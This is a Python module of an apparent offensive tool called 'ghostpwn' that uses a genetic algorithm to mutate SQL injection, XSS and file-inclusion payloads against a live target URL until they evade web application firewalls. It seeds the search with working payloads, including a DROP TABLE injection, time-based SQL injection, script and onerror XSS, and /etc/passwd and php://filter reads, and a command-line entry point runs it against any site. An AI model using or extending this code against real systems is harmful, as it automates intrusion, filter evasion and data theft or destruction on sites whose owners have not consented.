#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ghostpwn - Payload Evolution Engine
تطوير الـ payloads تلقائياً عبر genetic algorithm

الذكاء:
1. يبدأ بـ payloads أساسية
2. يختبرها ويقيّم النتائج
3. يهجّن (crossover) الأفضل
4. يعمل mutations
5. يطوّر payloads جديدة لـ bypass WAF/AV
"""
import sys
import os
import re
import time
import random
import string
import urllib.parse
from typing import Dict, List, Optional, Tuple, Callable
from concurrent.futures import ThreadPoolExecutor, as_completed

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from modules.http_client import HttpClient
from modules.arabic_display import SmartLogger, Colors, fix_display


# ============================ Genetic Payload ============================
class GeneticPayload:
    """payload كـ chromosome"""

    def __init__(self, content: str, vuln_type: str = ""):
        self.content = content
        self.vuln_type = vuln_type
        self.fitness = 0.0
        self.success = False
        self.generation = 0
        self.parents: List[str] = []

    def mutate(self) -> "GeneticPayload":
        """إنشاء mutation"""
        content = self.content

        # اختيار نوع mutation
        mutation_type = random.choice([
            "case", "encoding", "whitespace", "comment", "char_replace",
            "char_insert", "char_delete", "duplicate",
        ])

        if mutation_type == "case":
            # تغيير حالة حرف عشوائي
            chars = list(content)
            for i in range(len(chars)):
                if chars[i].isalpha() and random.random() < 0.1:
                    chars[i] = chars[i].swapcase()
            content = "".join(chars)

        elif mutation_type == "encoding":
            # URL encoding لحرف عشوائي
            chars = list(content)
            for i in range(len(chars)):
                if chars[i] not in ["'", '"', "<", ">", ";"] and random.random() < 0.05:
                    chars[i] = urllib.parse.quote(chars[i])
            content = "".join(chars)

        elif mutation_type == "whitespace":
            # استبدال مسافة بـ variation
            variations = ["\t", "\n", "\r", "/**/", "%20", "+"]
            content = content.replace(" ", random.choice(variations))

        elif mutation_type == "comment":
            # إدراج comment
            sql_keywords = ["SELECT", "UNION", "FROM", "WHERE", "AND", "OR", "INSERT", "UPDATE", "DELETE"]
            for kw in sql_keywords:
                if kw in content.upper():
                    idx = content.upper().index(kw)
                    content = content[:idx+2] + "/**/" + content[idx+2:]
                    break

        elif mutation_type == "char_replace":
            # استبدال حرف بـ آخر
            replacements = {
                "'": ["'", "\\'", "\u2019", "%27", "''"],
                '"': ['"', '\\"', "%22", '""'],
                " ": [" ", "/**/", "\t", "\n"],
                "<": ["<", "%3C", "&lt;"],
                ">": [">", "%3E", "&gt;"],
                ";": [";", "%3B"],
            }
            for char, alternatives in replacements.items():
                if char in content and random.random() < 0.3:
                    content = content.replace(char, random.choice(alternatives), 1)
                    break

        elif mutation_type == "char_insert":
            # إدراج حرف عشوائي
            pos = random.randint(0, len(content))
            char_to_insert = random.choice(["'", '"', " ", ";", "/", "<", ">"])
            content = content[:pos] + char_to_insert + content[pos:]

        elif mutation_type == "char_delete":
            # حذف حرف عشوائي
            if len(content) > 1:
                pos = random.randint(0, len(content) - 1)
                content = content[:pos] + content[pos+1:]

        elif mutation_type == "duplicate":
            # تكرار جزء
            if len(content) > 4:
                start = random.randint(0, len(content) - 4)
                end = start + random.randint(2, 4)
                content = content[:end] + content[start:end] + content[end:]

        mutant = GeneticPayload(content, self.vuln_type)
        mutant.generation = self.generation + 1
        mutant.parents = self.parents + [self.content[:30]]
        return mutant

    def crossover(self, other: "GeneticPayload") -> "GeneticPayload":
        """crossover مع payload آخر"""
        # اختيار نقطة crossover
        if len(self.content) < 2 or len(other.content) < 2:
            return self.mutate()

        # mix
        point1 = random.randint(1, len(self.content) - 1)
        point2 = random.randint(1, len(other.content) - 1)

        child_content = self.content[:point1] + other.content[point2:]

        child = GeneticPayload(child_content, self.vuln_type)
        child.generation = max(self.generation, other.generation) + 1
        child.parents = [self.content[:30], other.content[:30]]
        return child

    def __repr__(self):
        return f"GeneticPayload(content='{self.content[:30]}...', fitness={self.fitness:.2f}, gen={self.generation})"


# ============================ Fitness Functions ============================
class FitnessEvaluator:
    """تقييم مدى نجاحة الـ payload"""

    def __init__(self, http_client: HttpClient, url: str, param: str,
                 success_indicators: List[str] = None,
                 failure_indicators: List[str] = None):
        self.client = http_client
        self.url = url
        self.param = param
        self.success_indicators = success_indicators or []
        self.failure_indicators = failure_indicators or []

        # baseline
        baseline_url = self._build_url("test")
        self.baseline_response = self.client.get(baseline_url)
        self.baseline_length = len(self.baseline_response.get("body", ""))
        self.baseline_status = self.baseline_response.get("status", 0)

    def _build_url(self, value: str) -> str:
        """بناء URL مع payload"""
        parsed = urllib.parse.urlparse(self.url)
        params = urllib.parse.parse_qs(parsed.query) if parsed.query else {}
        params[self.param] = [value]
        new_query = urllib.parse.urlencode(params, doseq=True)
        return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                       parsed.params, new_query, parsed.fragment))

    def evaluate(self, payload: GeneticPayload) -> float:
        """تقييم payload - يرجع fitness score"""
        test_url = self._build_url(payload.content)
        resp = self.client.get(test_url)

        fitness = 0.0

        # 1) فحص success indicators
        body = resp.get("body", "")
        for indicator in self.success_indicators:
            if indicator.lower() in body.lower():
                fitness += 0.5
                payload.success = True

        # 2) فحص failure indicators (تقلل الـ fitness)
        for indicator in self.failure_indicators:
            if indicator.lower() in body.lower():
                fitness -= 0.3

        # 3) فحص status code
        if resp["status"] != self.baseline_status:
            if resp["status"] == 200:
                fitness += 0.2
            elif resp["status"] in [403, 406, 429]:  # WAF block
                fitness -= 0.5
            elif resp["status"] == 500:  # Error - ممكن ناجح
                fitness += 0.3

        # 4) فحص طول الـ response
        length_diff = abs(len(body) - self.baseline_length)
        if length_diff > 100:
            fitness += 0.2

        # 5) فحص reflection
        if payload.content in body:
            fitness += 0.3

        # 6) فحص timing
        if resp.get("elapsed", 0) > 3.0:
            fitness += 0.5  # time-based قد تكون ناجحة

        # 7) فحص error messages
        error_patterns = [
            r"SQL syntax", r"mysql_", r"SQLSTATE",
            r"Warning", r"Error", r"Exception",
            r"Traceback", r"stack trace",
        ]
        for pattern in error_patterns:
            if re.search(pattern, body, re.IGNORECASE):
                fitness += 0.3
                break

        return max(fitness, 0.0)


# ============================ Evolution Engine ============================
class PayloadEvolutionEngine:
    """محرّك تطور الـ payloads"""

    def __init__(self, http_client: HttpClient, audit_logger=None,
                 population_size: int = 20, max_generations: int = 10,
                 mutation_rate: float = 0.3, crossover_rate: float = 0.7):

        self.client = http_client
        self.audit = audit_logger
        self.logger = SmartLogger()

        self.population_size = population_size
        self.max_generations = max_generations
        self.mutation_rate = mutation_rate
        self.crossover_rate = crossover_rate

        self.population: List[GeneticPayload] = []
        self.best_payloads: List[GeneticPayload] = []
        self.evolution_history = []

    def _log(self, msg, level="info"):
        getattr(self.logger, level, self.logger.info)(msg)
        if self.audit:
            self.audit.log_event(f"[EVOLUTION] {msg}", level)

    def evolve_payload(self, initial_payloads: List[str], url: str, param: str,
                       success_indicators: List[str] = None,
                       failure_indicators: List[str] = None) -> Dict:
        """تطوير payloads عبر genetic algorithm"""

        self._log(f"بدء تطور payloads ({len(initial_payloads)} initial, {self.max_generations} generations)", "phase")

        # 1) إنشاء الـ population الأولي
        self.population = [GeneticPayload(p) for p in initial_payloads]

        # إضافة mutations للـ population الأولي
        while len(self.population) < self.population_size:
            parent = random.choice(self.population)
            self.population.append(parent.mutate())

        # 2) إنشاء fitness evaluator
        evaluator = FitnessEvaluator(
            self.client, url, param,
            success_indicators, failure_indicators
        )

        # 3) التطور عبر الأجيال
        for generation in range(self.max_generations):
            self._log(f"Generation {generation + 1}/{self.max_generations} ({len(self.population)} payloads)", "info")

            # تقييم كل payload
            for payload in self.population:
                payload.fitness = evaluator.evaluate(payload)

            # ترتيب حسب الـ fitness
            self.population.sort(key=lambda p: p.fitness, reverse=True)

            # حفظ الأفضل
            best = self.population[0]
            self.evolution_history.append({
                "generation": generation + 1,
                "best_fitness": best.fitness,
                "best_payload": best.content[:100],
                "success": best.success,
            })

            self._log(f"  Best: fitness={best.fitness:.2f}, payload='{best.content[:50]}...'", "info")

            # لو حصلنا على payload ناجح
            if best.success and best.fitness > 0.8:
                self._log(f"  Payload ناجح!", "success")
                self.best_payloads.append(best)
                break

            # 4) Selection - نختار الأفضل
            elite_count = max(2, self.population_size // 5)
            parents = self.population[:elite_count]

            # 5) إنشاء جيل جديد
            new_population = parents.copy()  # Keep elite

            while len(new_population) < self.population_size:
                # crossover
                if random.random() < self.crossover_rate and len(parents) >= 2:
                    parent1, parent2 = random.sample(parents, 2)
                    child = parent1.crossover(parent2)
                else:
                    parent = random.choice(parents)
                    child = parent.mutate()

                # mutation
                if random.random() < self.mutation_rate:
                    child = child.mutate()

                new_population.append(child)

            self.population = new_population

        # 6) النتائج النهائية
        final_best = max(self.population, key=lambda p: p.fitness)
        if final_best not in self.best_payloads:
            self.best_payloads.append(final_best)

        result = {
            "initial_payloads": initial_payloads,
            "generations_run": len(self.evolution_history),
            "best_payloads": [
                {
                    "content": p.content,
                    "fitness": p.fitness,
                    "generation": p.generation,
                    "parents": p.parents,
                    "success": p.success,
                }
                for p in self.best_payloads
            ],
            "evolution_history": self.evolution_history,
        }

        self._print_evolution_report(result)
        return result

    def _print_evolution_report(self, result: Dict):
        """عرض تقرير التطور"""
        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")
        print(f"{Colors.MAGENTA}  🧬 Payload Evolution Report{Colors.NC}")
        print(f"{Colors.MAGENTA}{'='*60}{Colors.NC}")

        print(f"\n  {Colors.BOLD}Generations:{Colors.NC} {result['generations_run']}")
        print(f"  {Colors.BOLD}Initial payloads:{Colors.NC} {len(result['initial_payloads'])}")

        if result["best_payloads"]:
            print(f"\n  {Colors.BOLD}Best payloads:{Colors.NC}")
            for i, p in enumerate(sorted(result["best_payloads"], key=lambda x: x["fitness"], reverse=True)[:5], 1):
                color = Colors.GREEN if p["success"] else Colors.YELLOW
                print(f"\n    {color}{i}. Fitness: {p['fitness']:.2f}{Colors.NC}")
                print(f"       Payload: {p['content']}")
                print(f"       Generation: {p['generation']}")
                if p["success"]:
                    print(f"       {Colors.GREEN}✓ SUCCESSFUL!{Colors.NC}")

        # Evolution history
        if result["evolution_history"]:
            print(f"\n  {Colors.BOLD}Evolution history:{Colors.NC}")
            for entry in result["evolution_history"][-5:]:  # آخر 5 أجيال
                color = Colors.GREEN if entry["success"] else Colors.YELLOW
                bar = "█" * int(entry["best_fitness"] * 20)
                print(f"    Gen {entry['generation']:2d}: {color}{entry['best_fitness']:.2f} {bar}{Colors.NC}")

        print(f"\n{Colors.MAGENTA}{'='*60}{Colors.NC}")


# ============================ Predefined Evolution Tasks ============================
def evolve_sqli_payloads(client: HttpClient, url: str, param: str) -> Dict:
    """تطوير SQLi payloads"""
    initial = [
        "' OR '1'='1",
        "' OR '1'='1' -- -",
        "' UNION SELECT NULL-- -",
        "1' AND SLEEP(3)-- -",
        "'; DROP TABLE users-- -",
    ]

    success_indicators = [
        "uid=", "root:", "MySQL", "SQL syntax",
        "SQLSTATE", "ORA-", "Microsoft SQL Server",
    ]

    engine = PayloadEvolutionEngine(client, population_size=15, max_generations=8)
    return engine.evolve_payload(initial, url, param, success_indicators)


def evolve_xss_payloads(client: HttpClient, url: str, param: str) -> Dict:
    """تطوير XSS payloads"""
    initial = [
        "<script>alert(1)</script>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "\"><script>alert(1)</script>",
        "javascript:alert(1)",
    ]

    success_indicators = [
        "<script>alert(1)</script>",
        "onerror=alert",
        "onload=alert",
    ]

    engine = PayloadEvolutionEngine(client, population_size=15, max_generations=8)
    return engine.evolve_payload(initial, url, param, success_indicators)


def evolve_lfi_payloads(client: HttpClient, url: str, param: str) -> Dict:
    """تطوير LFI payloads"""
    initial = [
        "../../../etc/passwd",
        "../../../../etc/passwd",
        "....//....//....//etc/passwd",
        "php://filter/convert.base64-encode/resource=index.php",
        "/etc/passwd",
    ]

    success_indicators = ["root:", ":/bin/", ":/home/"]

    engine = PayloadEvolutionEngine(client, population_size=15, max_generations=8)
    return engine.evolve_payload(initial, url, param, success_indicators)


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="ghostpwn - Payload Evolution")
    parser.add_argument("--url", required=True)
    parser.add_argument("--param", required=True)
    parser.add_argument("--type", choices=["sqli", "xss", "lfi"], default="sqli")
    args = parser.parse_args()

    client = HttpClient(timeout=10)

    if args.type == "sqli":
        result = evolve_sqli_payloads(client, args.url, args.param)
    elif args.type == "xss":
        result = evolve_xss_payloads(client, args.url, args.param)
    elif args.type == "lfi":
        result = evolve_lfi_payloads(client, args.url, args.param)
